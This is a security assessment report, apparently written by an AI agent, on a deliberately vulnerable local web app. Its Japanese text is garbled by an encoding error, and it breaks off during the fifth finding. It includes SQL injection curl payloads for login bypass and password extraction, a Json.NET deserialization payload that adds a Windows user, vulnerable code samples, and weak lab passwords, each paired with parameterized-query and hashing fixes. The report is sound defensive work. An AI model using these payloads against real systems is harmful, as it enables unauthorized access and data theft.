# ãƒªã‚¹ã‚¯è©•ä¾¡ & æ˜¯æ­£ææ¡ˆãƒ¬ãƒãƒ¼ãƒˆ

> å®Ÿæ–½æ—¥æ™‚: 2026å¹´02æœˆ23æ—¥  
> è¨ºæ–­å¯¾è±¡: vulnerability-siteï¼ˆãƒ­ãƒ¼ã‚«ãƒ« Docker Compose ç’°å¢ƒï¼‰  
> è¨ºæ–­æœŸé–“: 2026å¹´02æœˆ22æ—¥ ã€œ 2026å¹´02æœˆ23æ—¥  
> è¨ºæ–­å®Ÿæ–½è€…: CEHè„†å¼±æ€§è¨ºæ–­ã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆ

---

## ã‚¨ã‚°ã‚¼ã‚¯ãƒ†ã‚£ãƒ–ã‚µãƒãƒªãƒ¼

### è¨ºæ–­æ¦‚è¦

æœ¬è¨ºæ–­ã¯ã€ãƒ­ãƒ¼ã‚«ãƒ«DockerComposeç’°å¢ƒã§ç¨¼åƒã™ã‚‹Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã€Œvulnerability-siteã€ã‚’å¯¾è±¡ã«ã€CEHï¼ˆCertified Ethical Hackerï¼‰ã®æ‰‹æ³•ã«åŸºã¥ãåŒ…æ‹¬çš„ãªè„†å¼±æ€§è¨ºæ–­ã‚’å®Ÿæ–½ã—ã¾ã—ãŸã€‚

**è¨ºæ–­å¯¾è±¡:**
- Frontend: http://frontend:80 (React + Nginx)
- API: http://api:5000 (ASP.NET Core Web API)
- Database: db:5432 (PostgreSQL 16)

**ä½¿ç”¨ãƒ„ãƒ¼ãƒ«:**
- OWASP ZAP 2.16.1 (ã‚¢ã‚¯ãƒ†ã‚£ãƒ–ã‚¹ã‚­ãƒ£ãƒ³)
- Nmap 7.93 (ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¹ã‚­ãƒ£ãƒ³)
- Trivy 0.58 (ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã‚¹ã‚­ãƒ£ãƒ³)
- Nikto 2.6.0 (Webã‚µãƒ¼ãƒãƒ¼ã‚¹ã‚­ãƒ£ãƒ³)
- sqlmap (SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³æ¤œè¨¼)
- curl, Playwright (æ‰‹å‹•æ¤œè¨¼)

### ç·åˆãƒªã‚¹ã‚¯è©•ä¾¡

| æŒ‡æ¨™ | å€¤ |
|------|-----|
| ç·è„†å¼±æ€§æ•° | **16ä»¶** (ç¢ºèªæ¸ˆã¿) |
| Critical | **9ä»¶** |
| High | **2ä»¶** |
| Medium | **5ä»¶** |
| Low | **0ä»¶** |
| **ç·åˆãƒªã‚¹ã‚¯ãƒ¬ãƒ™ãƒ«** | **ğŸ”´ CRITICAL** |

### é‡å¤§ãªåˆ¤å®šçµæœ

**æœ¬ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ç¾çŠ¶ã®ã¾ã¾æœ¬ç•ªç’°å¢ƒã¸ã®å±•é–‹ã¯çµ¶å¯¾ã«ä¸å¯ã§ã™ã€‚**

ç†ç”±:
1. èªè¨¼ãƒ»èªå¯æ©Ÿæ§‹ãŒå®Œå…¨ã«ç ´ç¶»ã—ã¦ã„ã‚‹
2. SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã«ã‚ˆã‚Šå…¨ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹å†…å®¹ãŒæ¼æ´©å¯èƒ½
3. ãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒ¼ãƒ‰å®Ÿè¡Œï¼ˆRCEï¼‰ã®è„†å¼±æ€§ãŒå­˜åœ¨
4. ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒå¹³æ–‡ã§ä¿å­˜ãƒ»é€ä¿¡ã•ã‚Œã¦ã„ã‚‹
5. ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãƒãƒ¼ãƒˆãŒå¤–éƒ¨å…¬é–‹ã•ã‚Œã¦ã„ã‚‹

### ä¸»è¦ãªç™ºè¦‹äº‹é …ï¼ˆTop 5ï¼‰

1. **SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ - èªè¨¼ãƒã‚¤ãƒ‘ã‚¹ï¼ˆCVSS 10.0ï¼‰**
   - ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ä¸è¦ã§ä»»æ„ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦ãƒ­ã‚°ã‚¤ãƒ³å¯èƒ½
   - ç®¡ç†è€…æ¨©é™ã®ä¸æ­£å–å¾—ãŒå¯èƒ½

2. **å®‰å…¨ã§ãªã„ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºï¼ˆCVSS 10.0ï¼‰**
   - ãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒ¼ãƒ‰å®Ÿè¡Œï¼ˆRCEï¼‰ã«ã‚ˆã‚‹ã‚µãƒ¼ãƒãƒ¼å®Œå…¨æŒæ¡ã®å¯èƒ½æ€§
   - TypeNameHandling.All ã®ä½¿ç”¨ã«ã‚ˆã‚‹è‡´å‘½çš„ãªè¨­è¨ˆãƒŸã‚¹

3. **SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ - è¤‡æ•°ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆï¼ˆCVSS 9.8ï¼‰**
   - å…¨ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã§æ–‡å­—åˆ—é€£çµã«ã‚ˆã‚‹SQLæ§‹ç¯‰
   - ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹å…¨ä½“ã®èª­ã¿å–ã‚Šãƒ»æ”¹ã–ã‚“ãƒ»å‰Šé™¤ãŒå¯èƒ½

4. **ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãƒãƒ¼ãƒˆå¤–éƒ¨å…¬é–‹ï¼ˆCVSS 9.8ï¼‰**
   - ãƒãƒ¼ãƒˆ15432ãŒå¤–éƒ¨å…¬é–‹ã•ã‚Œç›´æ¥ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½
   - å¼±ã„ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ï¼ˆpostgres123ï¼‰ã§ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½

5. **ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰å¹³æ–‡ä¿å­˜ãƒ»éœ²å‡ºï¼ˆCVSS 9.1ï¼‰**
   - ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«å¹³æ–‡ã§ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ä¿å­˜
   - APIãƒ¬ã‚¹ãƒãƒ³ã‚¹ã«ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒå«ã¾ã‚Œã‚‹

---

## 1. è„†å¼±æ€§è©³ç´°

### 1.1 Critical ãƒ¬ãƒ™ãƒ«ï¼ˆ9ä»¶ï¼‰

---

#### VULN-001: SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ - èªè¨¼ãƒã‚¤ãƒ‘ã‚¹

- **CWE**: CWE-89 + CWE-287: SQL Injection + Improper Authentication
- **OWASP Top 10**: A03:2021 â€“ Injection + A07:2021 â€“ Identification and Authentication Failures
- **CVSS v3.1**: **10.0 (Critical)**
- **CVSS ãƒ™ã‚¯ãƒˆãƒ«**: AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
- **æ¤œå‡ºãƒ„ãƒ¼ãƒ«**: curlï¼ˆæ‰‹å‹•æ¤œè¨¼ï¼‰, sqlmap
- **æ¤œè¨¼ID**: V-05
- **å ´æ‰€**: `POST /api/login` (AuthController.cs:40)

**èª¬æ˜**:

ãƒ­ã‚°ã‚¤ãƒ³ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã§ãƒ¦ãƒ¼ã‚¶ãƒ¼åã¨ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’SQLã‚¯ã‚¨ãƒªã«ç›´æ¥åŸ‹ã‚è¾¼ã‚“ã§ã„ã‚‹ãŸã‚ã€SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã«ã‚ˆã‚‹èªè¨¼ãƒã‚¤ãƒ‘ã‚¹ãŒå¯èƒ½ã§ã™ã€‚ã“ã‚Œã¯**æœ€ã‚‚å±é™ºãªè„†å¼±æ€§**ã§ã‚ã‚Šã€èªè¨¼æ©Ÿæ§‹ãŒå®Œå…¨ã«ç ´ç¶»ã—ã¦ã„ã¾ã™ã€‚

**å½±éŸ¿**:

- ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’çŸ¥ã‚‰ãªãã¦ã‚‚ä»»æ„ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦ãƒ­ã‚°ã‚¤ãƒ³å¯èƒ½
- ç®¡ç†è€…æ¨©é™ã®ä¸æ­£å–å¾—
- ã‚»ãƒƒã‚·ãƒ§ãƒ³ä¹—ã£å–ã‚Š
- ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹å…¨ä½“ã¸ã®ä¸æ­£ã‚¢ã‚¯ã‚»ã‚¹

**è¨¼è·¡**:

```bash
# ãƒªã‚¯ã‚¨ã‚¹ãƒˆ
curl -X POST http://api:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR '\''1'\''='\''1","password":"anything"}'

# ãƒ¬ã‚¹ãƒãƒ³ã‚¹
{
  "success": true,
  "message": "Login successful",
  "user": {
    "id": 1,
    "username": "admin",
    "email": "admin@example.com",
    "password": "admin123",  # â† ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚‚å¹³æ–‡ã§éœ²å‡º
    "role": "admin"
  }
}
```

**æ˜¯æ­£ææ¡ˆ**:

å„ªå…ˆåº¦: ğŸ”´ å³åº§ã«å¯¾å¿œï¼ˆP0ï¼‰

**ä¿®æ­£å‰ï¼ˆè„†å¼±ãªã‚³ãƒ¼ãƒ‰ï¼‰**:
```csharp
// AuthController.cs - è„†å¼±ãªå®Ÿè£…
var sql = $"SELECT id, username, email, password, role, profile_image_url, created_at, updated_at FROM users WHERE username = '{request.Username}' AND password = '{request.Password}'";

using var cmd = new NpgsqlCommand(sql, conn);
using var reader = await cmd.ExecuteReaderAsync();
```

**ä¿®æ­£å¾Œï¼ˆå®‰å…¨ãªã‚³ãƒ¼ãƒ‰ï¼‰**:
```csharp
// AuthController.cs - å®‰å…¨ãªå®Ÿè£…
// 1. ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿åŒ–ã‚¯ã‚¨ãƒªã®ä½¿ç”¨
var sql = @"SELECT id, username, email, password_hash, role, profile_image_url, created_at, updated_at 
            FROM users 
            WHERE username = @username";

using var cmd = new NpgsqlCommand(sql, conn);
cmd.Parameters.AddWithValue("@username", request.Username);

using var reader = await cmd.ExecuteReaderAsync();

if (await reader.ReadAsync())
{
    var storedHash = reader.GetString(3); // password_hash
    
    // 2. ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®ãƒãƒƒã‚·ãƒ¥æ¤œè¨¼
    var isValid = BCrypt.Net.BCrypt.Verify(request.Password, storedHash);
    
    if (!isValid)
    {
        return Unauthorized(new { message = "Invalid credentials" });
    }
    
    // 3. ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã«ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å«ã‚ãªã„
    var user = new User
    {
        Id = reader.GetInt32(0),
        Username = reader.GetString(1),
        Email = reader.GetString(2),
        // Password = reader.GetString(3),  // â† å‰Šé™¤
        Role = reader.GetString(4)
    };
    
    return Ok(new { success = true, user });
}
```

**è¿½åŠ ã®å¯¾ç­–**:
1. **BCrypt.Net-Nextãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã®å°å…¥**
   ```xml
   <PackageReference Include="BCrypt.Net-Next" Version="4.0.3" />
   ```

2. **ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒãƒƒã‚·ãƒ¥åŒ–ã®å®Ÿè£…**
   - æ–°è¦ç™»éŒ²æ™‚: `BCrypt.Net.BCrypt.HashPassword(password)`
   - ãƒ­ã‚°ã‚¤ãƒ³æ™‚: `BCrypt.Net.BCrypt.Verify(password, hash)`

3. **ãƒ¬ãƒ¼ãƒˆåˆ¶é™ã®å®Ÿè£…**
   ```csharp
   services.AddRateLimiter(options =>
   {
       options.AddFixedWindowLimiter("login", opt =>
       {
           opt.Window = TimeSpan.FromMinutes(1);
           opt.PermitLimit = 5;
       });
   });
   ```

4. **MFAï¼ˆå¤šè¦ç´ èªè¨¼ï¼‰ã®å°å…¥** (æ¬¡æœŸé–‹ç™ºã§æ¤œè¨)

---

#### VULN-002: å®‰å…¨ã§ãªã„ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºï¼ˆRCEï¼‰

- **CWE**: CWE-502: Deserialization of Untrusted Data
- **OWASP Top 10**: A08:2021 â€“ Software and Data Integrity Failures
- **CVSS v3.1**: **10.0 (Critical)**
- **CVSS ãƒ™ã‚¯ãƒˆãƒ«**: AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
- **æ¤œå‡ºãƒ„ãƒ¼ãƒ«**: ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰åˆ†æ
- **æ¤œè¨¼ID**: V-10
- **å ´æ‰€**: `POST /api/import` (FileController.cs:56)

**èª¬æ˜**:

JSON.NETã®`TypeNameHandling.All`è¨­å®šã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ãŒä»»æ„ã®.NETã‚¯ãƒ©ã‚¹ã‚’ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹åŒ–ã§ãã¾ã™ã€‚ã“ã‚Œã¯**ãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒ¼ãƒ‰å®Ÿè¡Œï¼ˆRCEï¼‰**ã«ã¤ãªãŒã‚‹æ¥µã‚ã¦å±é™ºãªè„†å¼±æ€§ã§ã™ã€‚

**å½±éŸ¿**:

- ã‚µãƒ¼ãƒãƒ¼ä¸Šã§ã®ä»»æ„ã®ã‚³ãƒ¼ãƒ‰å®Ÿè¡Œ
- ã‚µãƒ¼ãƒãƒ¼ã®å®Œå…¨æŒæ¡
- ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã¸ã®ä¸æ­£ã‚¢ã‚¯ã‚»ã‚¹
- ä»–ã®ã‚·ã‚¹ãƒ†ãƒ ã¸ã®æ”»æ’ƒã®è¸ã¿å°åŒ–

**è¨¼è·¡**:

```csharp
// FileController.cs:56 - æ¥µã‚ã¦å±é™ºãªè¨­å®š
var settings = new JsonSerializerSettings
{
    TypeNameHandling = TypeNameHandling.All  // â† RCEã®åŸå› 
};
var result = JsonConvert.DeserializeObject(json, settings);
```

**æ”»æ’ƒã‚·ãƒŠãƒªã‚ªä¾‹**:
```json
POST /api/import
{
  "$type": "System.Diagnostics.Process, System",
  "StartInfo": {
    "$type": "System.Diagnostics.ProcessStartInfo, System",
    "FileName": "cmd.exe",
    "Arguments": "/c net user attacker P@ssw0rd /add"
  }
}
```

**æ˜¯æ­£ææ¡ˆ**:

å„ªå…ˆåº¦: ğŸ”´ å³åº§ã«å¯¾å¿œï¼ˆP0ï¼‰

**ä¿®æ­£å‰ï¼ˆè„†å¼±ãªã‚³ãƒ¼ãƒ‰ï¼‰**:
```csharp
// FileController.cs - æ¥µã‚ã¦å±é™º
var settings = new JsonSerializerSettings
{
    TypeNameHandling = TypeNameHandling.All
};
var result = JsonConvert.DeserializeObject(json, settings);
```

**ä¿®æ­£å¾Œï¼ˆå®‰å…¨ãªã‚³ãƒ¼ãƒ‰ï¼‰**:
```csharp
// FileController.cs - å®‰å…¨ãªå®Ÿè£…
using System.Text.Json;

// ã‚ªãƒ—ã‚·ãƒ§ãƒ³1: System.Text.Json ã‚’ä½¿ç”¨ï¼ˆæ¨å¥¨ï¼‰
var options = new JsonSerializerOptions
{
    PropertyNameCaseInsensitive = true,
    // TypeNameHandlingã¯å­˜åœ¨ã—ãªã„ï¼ˆå®‰å…¨ï¼‰
};

try
{
    // æ˜ç¤ºçš„ãªå‹ã‚’æŒ‡å®š
    var result = JsonSerializer.Deserialize<ImportDataModel>(json, options);
    
    if (result == null)
    {
        return BadRequest(new { message = "Invalid JSON format" });
    }
    
    // ãƒãƒªãƒ‡ãƒ¼ã‚·ãƒ§ãƒ³
    if (string.IsNullOrWhiteSpace(result.DataType) || result.Items == null)
    {
        return BadRequest(new { message = "Missing required fields" });
    }
    
    // å‡¦ç†...
}
catch (JsonException ex)
{
    return BadRequest(new { message = "Invalid JSON", error = ex.Message });
}

// ã‚ªãƒ—ã‚·ãƒ§ãƒ³2: Newtonsoft.Jsonã‚’ä½¿ã„ç¶šã‘ã‚‹å ´åˆ
// var settings = new JsonSerializerSettings
// {
//     TypeNameHandling = TypeNameHandling.None  // â† å®‰å…¨ãªè¨­å®š
// };
// var result = JsonConvert.DeserializeObject<ImportDataModel>(json, settings);
```

**ImportDataModelã®å®šç¾©**:
```csharp
public class ImportDataModel
{
    public string DataType { get; set; }
    public List<ImportItem> Items { get; set; }
}

public class ImportItem
{
    public string Name { get; set; }
    public string Value { get; set; }
}
```

**è¿½åŠ ã®å¯¾ç­–**:
1. **Newtonsoft.Jsonã®å®Œå…¨å‰Šé™¤ã‚’æ¤œè¨**ï¼ˆSystem.Text.Jsonã¸ã®ç§»è¡Œï¼‰
2. **å…¥åŠ›æ¤œè¨¼ã®å¼·åŒ–**ï¼ˆã‚¹ã‚­ãƒ¼ãƒãƒãƒªãƒ‡ãƒ¼ã‚·ãƒ§ãƒ³ï¼‰
3. **ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒãƒªã‚·ãƒ¼ã®ç­–å®š**ï¼ˆå¤–éƒ¨å…¥åŠ›ã®ä¿¡é ¼æ€§è©•ä¾¡ï¼‰

---

#### VULN-003: SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ - ãƒ¦ãƒ¼ã‚¶ãƒ¼æ¤œç´¢æ©Ÿèƒ½

- **CWE**: CWE-89: SQL Injection
- **OWASP Top 10**: A03:2021 â€“ Injection
- **CVSS v3.1**: **9.8 (Critical)**
- **CVSS ãƒ™ã‚¯ãƒˆãƒ«**: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
- **æ¤œå‡ºãƒ„ãƒ¼ãƒ«**: sqlmap, OWASP ZAP, curl
- **æ¤œè¨¼ID**: V-01
- **å ´æ‰€**: `GET /api/users?search={query}` (UsersController.cs:40)

**èª¬æ˜**:

æ¤œç´¢ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãŒSQLã‚¯ã‚¨ãƒªã«ç›´æ¥åŸ‹ã‚è¾¼ã¾ã‚Œã¦ãŠã‚Šã€SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã«ã‚ˆã‚Šãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹å…¨ä½“ã®å†…å®¹ãŒæ¼æ´©å¯èƒ½ã§ã™ã€‚

**å½±éŸ¿**:

- å…¨ãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒ‡ãƒ¼ã‚¿ã®å–å¾—ï¼ˆãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰å«ã‚€ï¼‰
- ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹æ§‹é€ ã®éœ²å‡º
- ãƒ‡ãƒ¼ã‚¿ã®æ”¹ã–ã‚“ãƒ»å‰Šé™¤

**è¨¼è·¡**:

```bash
# å…¨ãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒ‡ãƒ¼ã‚¿ã®å–å¾—
curl "http://api:5000/api/users?search=%27%20OR%20%271%27%3D%271"

# ãƒ¬ã‚¹ãƒãƒ³ã‚¹: å…¨ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒè¿”å´ã•ã‚Œã‚‹
[
  {"id":1,"username":"admin","password":"admin123",...},
  {"id":2,"username":"user1","password":"password123",...},
  ...
]
```

**æ˜¯æ­£ææ¡ˆ**:

å„ªå…ˆåº¦: ğŸ”´ å³åº§ã«å¯¾å¿œï¼ˆP0ï¼‰

**ä¿®æ­£å‰ï¼ˆè„†å¼±ãªã‚³ãƒ¼ãƒ‰ï¼‰**:
```csharp
// UsersController.cs:40
var sql = "SELECT id, username, email, password, role, profile_image_url, created_at, updated_at FROM users";

if (!string.IsNullOrEmpty(search))
{
    sql += $" WHERE username LIKE '%{search}%' OR email LIKE '%{search}%'";
}
```

**ä¿®æ­£å¾Œï¼ˆå®‰å…¨ãªã‚³ãƒ¼ãƒ‰ï¼‰**:
```csharp
// UsersController.cs - å®‰å…¨ãªå®Ÿè£…
var sql = @"SELECT id, username, email, role, profile_image_url, created_at, updated_at 
            FROM users";

var parameters = new List<NpgsqlParameter>();

if (!string.IsNullOrEmpty(search))
{
    sql += " WHERE username ILIKE @search OR email ILIKE @search";
    parameters.Add(new NpgsqlParameter("@search", $"%{search}%"));
}

using var cmd = new NpgsqlCommand(sql, conn);
foreach (var param in parameters)
{
    cmd.Parameters.Add(param);
}

// æ³¨æ„: passwordã‚«ãƒ©ãƒ ã¯å–å¾—ã—ãªã„
```

**è¿½åŠ ã®å¯¾ç­–**:
1. **ã™ã¹ã¦ã®SQLã‚¯ã‚¨ãƒªã‚’ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿åŒ–**
2. **APIãƒ¬ã‚¹ãƒãƒ³ã‚¹ã‹ã‚‰ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã‚’é™¤å¤–**
3. **å…¥åŠ›æ¤œè¨¼ã®å®Ÿè£…**ï¼ˆæ¤œç´¢æ–‡å­—åˆ—ã®é•·ã•åˆ¶é™ã€ç‰¹æ®Šæ–‡å­—ã®ãƒã‚§ãƒƒã‚¯ï¼‰
4. **ORMã®å°å…¥ã‚’æ¤œè¨**ï¼ˆEntity Framework Coreç­‰ï¼‰

---

#### VULN-004: SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ - ãƒ¦ãƒ¼ã‚¶ãƒ¼ä½œæˆãƒ»æ›´æ–°

- **CWE**: CWE-89: SQL Injection
- **OWASP Top 10**: A03:2021 â€“ Injection
- **CVSS v3.1**: **9.8 (Critical)**
- **CVSS ãƒ™ã‚¯ãƒˆãƒ«**: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
- **æ¤œå‡ºãƒ„ãƒ¼ãƒ«**: curl
- **æ¤œè¨¼ID**: V-03, V-04
- **å ´æ‰€**: `POST /api/users`, `PUT /api/users/{id}` (UsersController.cs:104, 136)

**èª¬æ˜**:

ãƒ¦ãƒ¼ã‚¶ãƒ¼ä½œæˆãƒ»æ›´æ–°æ™‚ã«ã€å…¥åŠ›å€¤ã‚’ç›´æ¥SQLã‚¯ã‚¨ãƒªã«åŸ‹ã‚è¾¼ã‚“ã§ã„ã‚‹ãŸã‚ã€SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã«ã‚ˆã‚‹ãƒ‡ãƒ¼ã‚¿æŠ½å‡ºãƒ»æ”¹ã–ã‚“ãŒå¯èƒ½ã§ã™ã€‚

**å½±éŸ¿**:

- ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹å†…ã®ä»»æ„ãƒ‡ãƒ¼ã‚¿ã®æŠ½å‡º
- ç®¡ç†è€…ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®çªƒå–
- ãƒ‡ãƒ¼ã‚¿ã®æ”¹ã–ã‚“

**è¨¼è·¡**:

```bash
# profileImageUrlçµŒç”±ã§adminã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’æŠ½å‡º
curl -X POST http://api:5000/api/users \
  -H "Content-Type: application/json" \
  -d '{
    "username":"attacker",
    "email":"test@test.com",
    "password":"test123",
    "role":"user",
    "profileImageUrl":"'\'' || (SELECT password FROM users WHERE id=1) || '\''"
  }'

# ãƒ¬ã‚¹ãƒãƒ³ã‚¹
{
  "profileImageUrl": "admin123",  # â† adminã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒæŠ½å‡ºã•ã‚ŒãŸ
  ...
}
```

**æ˜¯æ­£ææ¡ˆ**:

å„ªå…ˆåº¦: ğŸ”´ å³åº§ã«å¯¾å¿œï¼ˆP0ï¼‰

**ä¿®æ­£å‰ï¼ˆè„†å¼±ãªã‚³ãƒ¼ãƒ‰ï¼‰**:
```csharp
// UsersController.cs:104
var sql = $@"INSERT INTO users (username, email, password, role, profile_image_url)
             VALUES ('{user.Username}', '{user.Email}', '{user.Password}', 
                     '{user.Role}', '{user.ProfileImageUrl}')
             RETURNING id, username, email, password, role, profile_image_url, created_at, updated_at";
```

**ä¿®æ­£å¾Œï¼ˆå®‰å…¨ãªã‚³ãƒ¼ãƒ‰ï¼‰**:
```csharp
// UsersController.cs - å®‰å…¨ãªå®Ÿè£…
// 1. ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®ãƒãƒƒã‚·ãƒ¥åŒ–
var passwordHash = BCrypt.Net.BCrypt.HashPassword(user.Password);

// 2. ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿åŒ–ã‚¯ã‚¨ãƒª
var sql = @"INSERT INTO users (username, email, password_hash, role, profile_image_url)
            VALUES (@username, @email, @password_hash, @role, @profile_image_url)
            RETURNING id, username, email, role, profile_image_url, created_at, updated_at";

using var cmd = new NpgsqlCommand(sql, conn);
cmd.Parameters.AddWithValue("@username", user.Username);
cmd.Parameters.AddWithValue("@email", user.Email);
cmd.Parameters.AddWithValue("@password_hash", passwordHash);
cmd.Parameters.AddWithValue("@role", "user");  // roleã¯å›ºå®šï¼ˆMass Assignmentå¯¾ç­–ï¼‰
cmd.Parameters.AddWithValue("@profile_image_url", user.ProfileImageUrl ?? "");

using var reader = await cmd.ExecuteReaderAsync();

// æ³¨æ„: RETURNINGã«passwordã‚«ãƒ©ãƒ ã‚’å«ã‚ãªã„
```

**è¿½åŠ ã®å¯¾ç­–**:
1. **å…¥åŠ›ãƒãƒªãƒ‡ãƒ¼ã‚·ãƒ§ãƒ³ã®å®Ÿè£…**
   ```csharp
   // Data Annotations
   public class CreateUserRequest
   {
       [Required]
       [StringLength(100, MinimumLength = 3)]
       public string Username { get; set; }
       
       [Required]
       [EmailAddress]
       public string Email { get; set; }
       
       [Required]
       [StringLength(255, MinimumLength = 8)]
       public string Password { get; set; }
       
       [Url]
       public string ProfileImageUrl { get; set; }
   }
   ```

2. **Mass Assignmentå¯¾ç­–**ï¼ˆå¾Œè¿°ã®VULN-007å‚ç…§ï¼‰

---

#### VULN-005: ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãƒãƒ¼ãƒˆå¤–éƒ¨å…¬é–‹

- **CWE**: CWE-668: Exposure of Resource to Wrong Sphere
- **OWASP Top 10**: A05:2021 â€“ Security Misconfiguration
- **CVSS v3.1**: **9.8 (Critical)**
- **CVSS ãƒ™ã‚¯ãƒˆãƒ«**: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
- **æ¤œå‡ºãƒ„ãƒ¼ãƒ«**: docker-compose.ymlç¢ºèª, psql
- **æ¤œè¨¼ID**: V-14
- **å ´æ‰€**: docker-compose.yml:40

**èª¬æ˜**:

PostgreSQLã®ãƒãƒ¼ãƒˆ5432ãŒãƒ›ã‚¹ãƒˆå´ã®ãƒãƒ¼ãƒˆ15432ã¨ã—ã¦å¤–éƒ¨å…¬é–‹ã•ã‚Œã¦ãŠã‚Šã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«ç›´æ¥ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ã§ã™ã€‚ã•ã‚‰ã«ã€å¼±ã„ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ï¼ˆpostgres123ï¼‰ã¨SSL/TLSæœªä½¿ç”¨ã«ã‚ˆã‚Šã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãŒæ¥µã‚ã¦è„†å¼±ã§ã™ã€‚

**å½±éŸ¿**:

- ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã¸ã®ç›´æ¥æ”»æ’ƒ
- å…¨ãƒ‡ãƒ¼ã‚¿ã®èª­ã¿å–ã‚Šãƒ»æ”¹ã–ã‚“ãƒ»å‰Šé™¤
- ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³å±¤ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¯¾ç­–ãŒç„¡åŠ¹åŒ–

**è¨¼è·¡**:

```yaml
# docker-compose.yml:40
db:
  ports:
    - "15432:5432"  # â† å¤–éƒ¨å…¬é–‹
  environment:
